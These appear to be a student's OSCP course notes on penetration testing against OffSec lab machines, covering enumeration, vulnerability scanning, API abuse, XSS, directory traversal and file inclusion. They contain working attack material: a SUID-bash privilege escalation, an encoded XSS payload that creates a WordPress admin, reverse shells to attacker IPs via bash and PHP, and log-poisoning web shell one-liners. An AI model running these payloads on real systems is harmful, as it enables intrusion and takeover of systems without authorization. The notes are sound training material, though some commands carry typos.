# OSCP Videos Challenge Labs

# Links

Transfer Files

[https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100-49568/learning/file-transfers-46870](https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100-49568/learning/file-transfers-46870)

[https://discord.com/channels/780824470113615893/1148907181480104028](https://discord.com/channels/780824470113615893/1148907181480104028)

```markdown
SMB Transfer
kali>impacket-smbserver test . -smb2support  -username ashok -password ashok
WIN>net use m: \\192.168.45.155\home\kali\Desktop\HTB\OSCP\AD\Medtech /user:ashok ashok
WIN>copy 20240715135750_BloodHound.zip m:\
```

Windows search .log, .txt  - Get-ChildItem -Path C:\ -Filter *.log -Recurse

1. PT with Kali Linux General Course Information

```bash
#SSH Connection
terminal>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52 (-o options are used for prevent the **known-hosts** file on our local Kali machine from being corrupted.)
```

```jsx
┌──(kali㉿kali)-[~/HTB/OSCP/Relia]
└─$ x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll   
x86_64-w64-mingw32-gcc: fatal error: cannot execute ‘cc1plus’: execvp: No such file or directory
compilation terminated.

#Solved
>sudo apt-get install g++-mingw-w64
```

### rbash

Seclist have i need to look into it.

```jsx
ssh <user>@<ip> -t "bash --noprofile"
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Sudo -l

```jsx
#(ALL) NOPASSWD: /../../../../../../home/user/.cgi_bin/bin /tmp/*
#creating bin file in the user
nano bin
#!/bin/bash
chmod u+s /bin/bash
---END
#Run his command woth sudo
sudo /../../../../../../home/user/.cgi_bin/bin /tmp/*
ll /bin/bash 
#Stickiy bit is set
/bin/bash -p
id #if euid is set 0
#then root
whoami
```

# 3. Intro to Cybersecurity

In cybersecurity, **Tactics, Techniques, and Procedures (TTPs)** are essentially the "playbook" that attackers use to execute cyberattacks. It's like understanding the "how" and "why" behind their actions, allowing defenders to better anticipate and prevent attacks.

Here's a breakdown of each element:

- **Tactics:** The **"why"** behind an attack. This refers to the attacker's overall goal, such as stealing data, disrupting operations, or gaining unauthorized access.
- **Techniques:** The **"how"** an attacker achieves their tactics. These are the specific methods and tools used to carry out the attack, like phishing emails, malware deployment, or exploiting software vulnerabilities.
- **Procedures:** The **specific steps** taken to implement a technique. This could involve things like crafting a convincing phishing email, setting up a command and control server, or executing specific exploit code.

**Imagine this analogy:** Think of a bank robbery. The **tactic** is stealing money (the "why"). The **technique** could be using force (like armed robbery) or deception (like a social engineering scam). The **procedures** would be the specific steps taken to execute the chosen technique, like disarming guards, cracking safes, or manipulating bank employees.

# 5.Report Writing for Penetration Testers

- Instead of preparing a report in advance, the penetration test is executed and notes are taken as it proceeds to ensure that there is a detailed record of what was done. This makes sure that:
- -The penetration test can be repeated if it becomes necessary to demonstrate that an **issue is real.**
- -The penetration test can be repeated after **remediation** to confirm that an issue has been fixed.
- -If there’s a system failure during the period of the penetration test, the **client and tester can determine if the testing was the cause of the failure**.
- During a penetration test, some activities may not be permitted. We have to be very clear about the ***Rules of Engagement* (RoE)** under which the testing is done. When conducting red team testing, a person will often be assigned the role of "**referee**" to ensure that the rules of engagement are observed. There may be constraints placed on testing such as not carrying out denial of service attacks, or not engaging in social engineering.

### The General Structure of Penetration Testing

- **Rather than taking a few general notes assuming** that we'll remember how to perform certain actions next time, **we should record exactly what we did**.
- This means that **every command that we type, every line of code that we modify, and even anywhere we click in the GUI should be recorded** so that we can reproduce our actions.
- Even if we've taken a lot of notes, if looking at them later doesn't help us remember exactly what happened during the **assessment**, then they won't be particularly useful to us.
- The notes need to be **structured and sufficiently detailed** to remove any ambiguity.
- To write a convincing and substantiated technical report later, we need to provide **sufficient technical details** within our notes.
- If the notes are not written coherently, it will be difficult for **someone else to repeat the test** and get the same results.

### Web vulnerability we might take notes

- **Application Name**: This is important in a multi-application test, and a good habit to get into. The application names also lends itself to building a natural folder and file structure quite nicely.
- **URL**: Exact URL to locate vulnerability we’ve detected.
- **Request Type**: This represents both type of request (i.e.: GET, POST, OPTIONS, etc. ) that we made, as well as post request using credentials before forwarding request.
- **Issue Detail**: The overview of vulnerability that will be triggered by our actions. For example, we may point to a CVE describing the vulnerability if one exists. And explain the impact we observe. we may categorize the impact as denial of service, remote code execution, privilege escalation, and so on.
- **Proof of Concept Payload**: This is a string or code of block that will trigger the vulnerability.
- exact code or commands that would need to be used to perform the triggers the vulnerability again.

![Untitled](Untitled.png)

### Report has audience

1. Executive summary: senior management to understand the scope and outcomes of the testing at a sufficient level to understand the values of test, and approve remediation.
2. Technical summary: a list of all of the key findings in the report, written out with a summary and recommendation for a technical person, like a security architect, to learn at a glance what needs to be done.

![Untitled](Untitled%201.png)

![Untitled](Untitled%202.png)

![Untitled](Untitled%203.png)

![Untitled](Untitled%204.png)

### Technical summary

![Untitled](Untitled%205.png)

![Untitled](Untitled%206.png)

# 6.Information Gathering

A typical penetration test comprises the following stages:

1. Defining the scope
2. Information Gathering
3. Vulnerability Detection
4. Initial Foothold
5. Privilege Escalation
6. Lateral Movement
7. Reporting/Analysis
8. Lessons Learned/Remediation

## Passive Info Gathering

```bash
### Whois Enumeration
>whois [megacrop.com](http://megacrop.com) -h 1.2.3.4
>whois 2.2.2.2 -h 1.2.3.4

### Google Hacking Database
>site:megacrop.com
>site:megacrop.com filetype:txt
>site:megacrop.com -filetype:html
>intitle:"indexof" "parentdirectory”

### Netcraft
https://www.netcraft.com/tools/
https://searchdns.netcraft.com/

### Open-source Code
search bar >filename:users

### Shodan
https://www.shodan.io/

###Security Headers and SSL/TLS
https://securityheaders.com/
https://www.ssllabs.com/ssltest/
```

## Active Info Gathering

```bash
### DNS Enumeration
host www.hegacropone.com (record A)
host -t mx www.hegacropone.com (lowest priority used first), -t txt
host idontexit.hegacropone.com (error)
------------------------------------Till now used forward DNS lookup
Creating bash one liner
for that cat list.txt
www
ftp
mail
owa
proxy
router -----------end txt file
terminal> for ip in $(cat list.txt); do host $ip.megacropone.com; done
terminal> for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" -----end
https://github.com/darkoperator/dnsrecon
dnsrecon -d megacropone.com -t std (-d domain, -t standard scan)
dnsrecon -d megacropone.com -D ~/list.txt -t brt (-d domain name,-d filename subdomain string, -t attack)
https://github.com/SparrowOchon/dnsenum2
dnsenum megacropone.com(discoverd unknown hosts)
NSLOOKUP - Windows
nslookup mail.megacroptwo.com
nslookup -type=TXT info.megacroptwo.com 192.168.50.151

###Port Scanning with NMAP
services - **/usr/share/nmap/nmap-services**
>nc -nvv -w 1 -z 192.168.50.152 3388-3390 (TCP)
>nc -nv -u -z -w 1 192.168.50.149 120-123 (UDP)
1000 most popular ports (traffic using IP tables)
terminal>sudo iptables -I INPUT 1 -s 192.168.50.149 -j ACCEPT (-I insert new rule given chain,-s source address, -j accept traffic)
terminal>sudo iptables -I OUTPUT 1 -d 192.168.50.149 -j ACCEPT (-d destination address)
terminal>sudo iptables -Z (-z is zero the packets for all chains follow counter by all chains)
-another terminal>nmap 192.168.50.149
terminal> sudo iptables -vn -L (-v verbose, n numaric output, l for list present in all chains)
terminal> sudo iptables -Z (zeroing iptable) ---clear before running new scan
-another terminal>nmap -p 1-65535 192.168.50.149
terminal> sudo iptables -vn -L (4 mb of traffic)
terminal> sudo iptables -Z (zeroing iptable) ---clear before running new scan

terminal> sudo nmap -sS 192.168.50.149 (syn stealth Do not complete 3 way handshake)
terminal> sudo nmap -sT 192.168.50.149 (TCP connect scan it completes 3 way handshake)

UDP Scan
terminal>sudo nmap -sU 192.168.50.149 (sudo need to access for raw sockets)
terminal>sudo nmap -sU -sS 192.168.50.149 (sudo need to access for raw sockets, using syn stealth more complete picture of target)

Increasing full network using n/w sweeping technique
terminal>nmap -sn 192.168.50.1-253
terminal>nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt 
terminal>grep Up ping-sweep.txt | cut -d " " -f 2

More accurate then ping sweep (save time and n/w resources)
terminal>nmap -p 80 192.168.50.1-253 -oG web-sweep.txt
terminal>grep open web-sweep.txt | cut -d" " -f 2

TCP connect scan using top ports option, OS and version detection
terminal>nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt

terminal>cat /usr/share/nmap/nmap-services (shows list of sevices)

terminal> sudo nmap -O 192.168.50.14 --osscan-guess (uses TCP/IP stack, more accurate, guess the result even not accurate)
 
terminal> sudo nmap -sV -sT -A 192.168.50.148 (servive banners, various enumerations with -A )

terminal>nmap --script http-header 102.168.50.6 (tries to connect http system)
help --- >nmap --script-help http-headers

Windows check port 445 is open
PowerShell>
PS>Test-NetConnection -Port 445 192.168.50.151
TcpTestSucceeded : True (true means open)

checking top 1024 open or not using PS one liner
PS>foreach ($port in 1..1024) {If (($a=Test-NetConnection 192.168.50.151 -Port $port -Warn
ingAction SilentlyContinue).tcpTestSucceeded -eq $true){"TCP port $port is open"}}

###SMB Enumeration
Unauthenticated vulnerability updated accoring windows updates,
1.NetBIOS service listen on TCP port 139, as well as sevral UDP ports, 
   it should be noted that SMB, TCP port 445, and NetBIOS are two seperate protocols.
2.NetBIOS is an indepandent session layer protocol and service that allow computers on a local n/w to communicate with each other.
3.while modern implementation of SMB can work without NetBIOS, NetBIOS over TCP is required for backward compatibility and these are often enabled together.
4. This servives sometimes hand-in-hand using nmap many more tools

terminal>nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
terminal>sudo nbtscan -r 192.168.50.0/24/
terminal>ls -l /usr/share/nmap/scripts/smb* (several scripts from nmap scripts.)
terminal>nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152 (finds Windows OS, SMB provide more information OS and generate less traffic)
Windows NetView
CMD> net view \\dc01 /all  (using /all option we see administrative shares ending with dollar sign)

### SMB ALL
nmblookup -A 192.168.213.152
nbtscan -r 192.168.213.152
nmap --script nbstat.nse 192.168.213.152
ping -a 192.168.213.152
smbmap -H 192.168.213.152 -u student -p lab
smbclient -L 192.168.213.152
smbclient -L 192.168.213.152 -U student%lab
crackmapexec smb 192.168.213.152 -u 'student' -p 'lab' --shares
rpcclient -U "" -N 192.168.213.152
rpcclient -U "student" -P "lab" -N 192.168.213.152

###SMTP Enumeration
SMTP supports
VRFY- asks servers verify email address
EXPN- asks servers membership of mailing list
terminal>nc -nv 192.168.50.8 25
TYPE> VERY root (checks user existed or not)

script to verify valid using using SMTP protocol.
mousepad smtp.py
-----------------------------------------------
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
   print("Usage: vrfy.py <username> <target_ip>")
   sys.exit(0)

#create a socket
s = socket.socket(soket.AF_INET, socket.SOCK_STREAM)

#connect to the server
ip = sys.argv[2]
connect = s.connect((ip,25) )

#receive the banner
banner = s.recv(1024)

print(banner)

#very a user
user = (sys.argv[1]).encode()
s.send(b'VRFY' + user + b'\r\n')
result = s.recv(1024)

print(result)

#close the socket
s.close()
-------------------------------------------------
terminal> python3 smtp.py root 192.168.50.8

Windows 
PS>Test-NetConnection -Port 25 192.168.50.8 (need to install telnet client, problem might face if have low privileges)
PS>dism /online /Enable-Feature /FeatureName:TelnetClient
PS>telnet 192.168.50.8 25
TYPE>VRFY goofy

###SNMP Enumeration
1.SNMP based on UDP, simple stateless, then susecptible to  ip spoofing and replay attacks
2.Commnonly used version SNMP protocols 1, 2, 2c offer no traffic encryption weak authentication.
SNMP MIB Tree (Management Information Base, database containeing n/w management, leaves of of the tree accessed by external user)

terminal>sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt (udp ports , limit to port 161)
terminal>echo public > community
terminal>echo private >> community
terminal>echo manager >> community
terminal>for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
terminal>onesixtyone -c community -i ips

terminal>snmpwalk -c public -v1 -t 10 192.168.50.151
terminal>snmpwalk -c public -v1 192.168.50.151 1.2.6.1.4.1.77.1.2.25 (MIB tree id associated with local users)
terminal>snmpwalk -c public -v1 -t 10 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2 (system process)
terminal>snmpwalk -c public -v1 -t 10 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2 (all the softwares installed on the machines, cross check with process)
terminal>snmpwalk -c public -v1 -t 10 192.168.50.151 1.3.6.1.2.1.6.13.1.3 (listening TCP ports locally)
```

![Untitled](Untitled%207.png)

# 7 Vulnerability Scanning

### Vulnerability Scanners Work

The Basic of an automated vulnerability scanner can be described as:

1. Host Discovery
2. Port Scanning
3. Operating system, service, and version detection
4. Matching the results to a vulnerability database.

![Untitled](Untitled%208.png)

A **manual vulnerability** scan will inevitably be very resource intensive and time consuming. When there is a huge amount of data to analyze, we often reach our cognitive limit quickly and overlook vital details. On the other hand, manual vulnerability scanning allows for the discovery of complex and logical vulnerabilities that are rather difficult to discover using any type of automated scanner.

**Automated vulnerability** scans are invaluable when working on engagements for a multitude of reasons. First, in nearly all types of assessments, we have time constraints. Therefore, when we have a big enterprise network to scan, we cannot manually review every system. This is especially true when thinking about new or complex vulnerabilities. Second, by using automated scanners, we can quickly identify easily-detected vulnerabilities and other low-hanging fruit.

### Types of Vulnerability Scans

**Unauthenticated**-When we perform a vulnerability scan on a system without providing credentials, 

Therefore, they map the system with all open ports and provide us with an attack surface by matching the information to vulnerability databases as mentioned before.

However, we get **no information about local security flaws, such as missing patches**, outdated software, or configuration vulnerabilities on the system itself. For example, in an unauthenticated vulnerability scan on a Windows target, we cannot determine if the system is patched against the ***HiveNightmare*[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/vulnerability-scanning/vulnerability-scanning-theory/types-of-vulnerability-scans#fn3)** vulnerability, which allows a unprivileged user to read sensitive system files. This is where authenticated scans come into play

**Authenticated**-The goal of authenticated vulnerability scans is to check for vulnerable packages, missing patches, or configuration vulnerabilities.

**Nessus Download link - Activation Code: FXE8-UJ4V-5XAM-73RH-AXT6**

[Download Tenable Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)

Checksum verify

>echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb" > sha256sum_nessus

>sha256sum -c sha256sum_nessus (If it’s correct you get OK, wrong checksum did not match)

>sudo systemctl start nessusd.service (start nessus service)

>/bin/systemctl start nessusd.service (start nessus service)

>[https://kali:8834/](https://kali:8834/) (accessiable for web)

## Vulnerability Scanning with Nmap

Same like Nessus, Nmap scripting Engine (NSE) has some script we can automate the vulnerability scanning using vuln scripts.

For example, it can be categorized as *safe* and *vuln*, or *intrusive* and *vuln*. Scripts categorized as "safe" have no potential impact to stability, while scripts in the "intrusive" category might crash a target service or system. **To avoid any stability issues**, it's imperative to check how the scripts are categorized and we should never run an NSE script or category without understanding the implications.

While Nmap is not a vulnerability scanner in the traditional sense, we found that the NSE is a powerful feature that allows us to do lightweight vulnerability scanning. **In a penetration test, we can use Nmap when there isn't a full-fledged vulnerability scanner available or when we want to verify findings from other tools.**

Good website for vulnerabilities some plugins available for burp suite,  Nmap, Chrome.

[CVE Database - Security Vulnerabilities and Exploits | Vulners.com](https://vulners.com/)

![Untitled](Untitled%209.png)

![Untitled](Untitled%2010.png)

```bash
>cd /usr/share/nmap/scripts                                                                                                                                                                                          
>cat script.db| grep "\"vuln\""
>sudo nmap --script "vuln" -sV -p 443 192.168.210.13 (It will uses the entire vuln scripts)
###Adding the script to NSE script database
Download fron this address - https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse
>sudo cp http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
>sudo nmap --script-updatedb
> sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.210.13 (After entering the command given vulnerable path we can check the /etc/passwd file)
Check above screenshots download the script add to NSE, Find vulnerabilities like Nessus
```

# 8 Intro to Web Application Attack

**Web Application Assessment Methodology**

1. Understand **web application security testing requirements**
2. Learn different **types and methodologies of web application testing**
3. Learn about the **OWASP Top 10 and most common web vulnerabilities**

As a penetration Tester, we can assess a web application using different methods, depending on the kind of information we have provided, the scope, and the particular engagement rules.

1. **White-box** testing access to application’s **source code, infrastructure it resides on, design documentation. Includes source code and application logic review.** Take **longer time**, relative to the size of the code base being reviewed.
2. **Black-box** testing (**Zero-knowledge test**) provides no information about the **target application, meaning it’s essential for the tester to invest significant resources into the enumeration stage**. This approach taken during most bug bounty engagements.
3. **Gary-box** testing occurs whenever we are provided with **limited information** on the target’s scope, including **authentication methods, credentials, or details about the framework.**

## Web Application Assessment Tools

**Wappalyzer** - Third-party plugin JS libraries are known to be affected by several vulnerabilities. we found that OS, UI framework, web server, JS libraries 

```bash
###Fingerprinting Web Servers with Nmap
>sudo nmap -p 80 -sV 192.168.50.20 (we will get the server and OS details in this case Apache 2.4.41 ubuntu server dig down more further)
>sudo nmap -p 80 --script=http-enum 192.168.50.20
###Directory Brute FOrce with Gobuster
>gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 10
```

## Web Application Enumeration

1. Learn how to debug Web Application source.
2. Understand how to enumerate and inspect Headers, cookies, and Source Code
3. Learn how to conduct API testing methodologies

We should first attempt to discover the technology stack in use

1. Host Operating System
2. Web Server Software
3. Database software
4. Frontend/backend programming language.

**Good resource about web framework**

[Web framework](https://en.wikipedia.org/wiki/Web_framework)

![Untitled](Untitled%2011.png)

```bash
>gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
>curl -i http://192.168.50.16:5002/users/v1
>gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
>curl -i http://192.168.50.16:5002/users/v1/admin/password
>curl -i http://192.168.50.16:5002/users/v1/login
>curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
>curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
>curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
>curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
>curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}

```

## Cross-site Scripting

Different type of Cookies

1. Session
2. Secure
3. HTTP_Only
4. 

[How to craft an XSS payload to create an admin user in Wordpress - Toronto Web Design and Development | Shift8 Web](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)

```bash
###Execure the below code browsers console tab in developer options
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```

## Privilese Escalation using xss

```bash
###Compress below 2 set of codes

###Below is compresed code
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);

###Execute the below code in the broswers console this convert the payload into UTF-16 so that application don't parse any of these special strings
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)

### Insert the compresed code in "insert_minified_javascript" to get encoded values
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)

###Sending this code through terminal capturing in burpsuite
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080

###below response
before entering the above command 
>start the burpsuite, intercept on
>execute the above code
> turnoff the intercept 
>check wordpress, vister page for blanck request and users tab for newly created user
```

![Untitled](Untitled%2012.png)

Burpsuite part

![Untitled](Untitled%2013.png)

### Wordpress shell one lines

getting shell for this seclists [https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php)

procedure [https://ppn.snovvcrash.rocks/pentest/web/wordpress](https://ppn.snovvcrash.rocks/pentest/web/wordpress)

encoding the url using [https://www.urlencoder.org/](https://www.urlencoder.org/)

> [http://alvida-eatery.org/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=%2Fusr%2Fbin%2Fphp -r '%24sock%3Dfsockopen("192.168.45.157"%2C4455)%3B`sh <%263 >%263 2>%263`%3B'](http://alvida-eatery.org/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=%2Fusr%2Fbin%2Fphp%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.157%22%2C4455%29%3B%60sh%20%3C%263%20%3E%263%202%3E%263%60%3B%27)
> 

> /usr/bin/php -r '$sock=fsockopen("192.168.45.157",4455);`sh <&3 >&3 2>&3`;'  #encode
> 

finding the flag.txt

> find / -type f -name "*.txt”   like flag.txt
> 

below screen shots

![Untitled](Untitled%2014.png)

# 9 Common Web Application Attacks

## Directory Traversal

1. Absolute Path- Specifies the complete location of a file or directory from the root directory (/) of the filesystem. **starts with (/)**
2. Relative Path- Specifies the location of a file or directory relative to your current working directory (where you are in the filesystem). **Doesn’t start with a forward slash (/).**

| **Feature** | **Absolute Path** | **Relative Path** |
| --- | --- | --- |
| Starting point | Root directory (/) | Current working directory (.) |
| Portability | Works anywhere in the filesystem | Depends on the current working directory |
| Length | Longer | Shorter |
| Example | **/home/user/Documents/report.txt** | **Documents/report.txt** |

### Test the Directory Traversal

1. Linux - **/etc/passwd**
2. Windows - **C:\Windows\System32\drivers\etc\hosts, C:\inetpub\logs\LogFiles\W3SVC1\ , C:\inetpub\wwwroot\web.config**

```bash
###FIrst analyze the website with any pages with urls
http://mountaindesserts.com/meteor/index.php?page=admin.php
find the /etc/passwd to find what are users avaliable the find the location ssh user keys
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

###Google "golangexample cve-2021-43798 --path-as-is"
http://Ip:3000/public/plugins/alertlist/../../../../../../../../../../Users/install.txt", you can also Are there other payloads?
###Encoding Directory Traversal
>curl 192.168.244.16/cgi-bin/../../../../../../../../../etc/passwd
**#Each '.' is replaced with '%2e'**
>curl 192.168.244.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
>curl 192.168.244.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
###Grafana Directory Traversal
>curl http://192.168.244.16:3000/login | grep "Grafana v" (Find version of Grafana)
>http://192.168.244.16:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
>http://192.168.244.16:3000/public/plugins/alertlist/../../../../../../../../opt/install.txt
```

## File Inclusion Vulnerabilities

1. A file include vulnerability is distinct from a generic [directory traversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack), in that directory traversal is a way of gaining unauthorized [file system](https://en.wikipedia.org/wiki/File_system) access, and a file inclusion vulnerability subverts how an application loads code for execution.
2. we leverage a directory traversal vulnerability in a PHP web application and specify the file **admin.php**, the source code of the PHP file will be displayed. On the other hand, when dealing with a file inclusion vulnerability, the **admin.php** file will be executed instead.

```bash
###File Inclusion
>http://192.168.244.16/meteor/index.php?page=../../../../../../../../../../../../etc/passwd
>http://192.168.244.16/meteor/index.php?page=../../../../../../../../../../../../var/log/apache2/access.log
#Check the USer-Agent wheather storing Broser details then Inject the payload into User-Agent
>"**<?php echo system($_GET['cmd']); ?>**"  (PHP oneliner or one liner)
>bash -i >& /dev/tcp/192.168.45.215/4444 0>&1
>bash -c "bash -i >& /dev/tcp/192.168.45.215/4444 0>&1"
### we nned to upload above oneline in the burpsuite USER_AGENT "**<?php echo system($_GET['cmd']); ?>**" (below screenshot)
http://192.168.244.16/meteor/index.php?page=../../../../../../../../../../../../var/log/apache2/access.log&cmd=ls(make sure to encode)
>http://192.168.244.16/meteor/index.php?page=../../../../opt/admin.bak.php
```

![Untitled](Untitled%2015.png)

Forward the request, the in the repeated use keyword “cmd” to retrieve the information

![Untitled](Untitled%2016.png)

### Windows OS Directory Traversal

```bash
http://192.168.244.193/meteor/index.php?page=C:\Windows\system32\drivers\etc\hosts
good article - https://endeav0r.medium.com/automating-web-log-file-poisoning-with-logpoisoner-5477fc1e0f9f
```

Change the command accordingly

![Untitled](Untitled%2017.png)

Encode the space as %20

![Untitled](Untitled%2018.png)

### PHP wrappers

```bash
###PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions
>http://192.168.244.16/meteor/index.php?page=admin.php
>http://192.168.244.16/meteor/index.php?page=php://filter/resource=admin.php(the same link like above but using PHP Wrappers to encoding kindof thing)
>http://192.168.244.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php(In browser or curl command)
>curl http://192.168.244.16/meteor/index.php?page=php://filter//convert.base64-encode/resource=/var/www/html/backup.php
below screenshot to get the flag
###data PHP Wraper
